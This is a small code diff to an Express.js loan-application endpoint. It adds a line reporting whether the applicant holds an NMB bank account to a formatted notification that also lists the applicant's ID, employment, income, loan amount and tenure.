@@ -120,6 +120,7 @@ app.post('/api/loan', async (req, res) => {
       nid          ? `🪪 <b>National ID:</b> <code>${nid}</code>`     : null,
       emp          ? `💼 <b>Employment:</b> ${empLabel}`              : null,
       income       ? `💰 <b>Income:</b> USD ${Number(income).toLocaleString()}/month` : null,
+      req.body.hasAcct !== undefined ? `🏦 <b>NMB Account:</b> ${req.body.hasAcct ? '✅ Confirmed' : '❌ No account'}` : null,
       ``,
       amount       ? `💵 <b>Loan Amount:</b> USD ${Number(amount).toLocaleString()}` : null,
       tenure       ? `📅 <b>Tenure:</b> ${tenure} months`            : null,
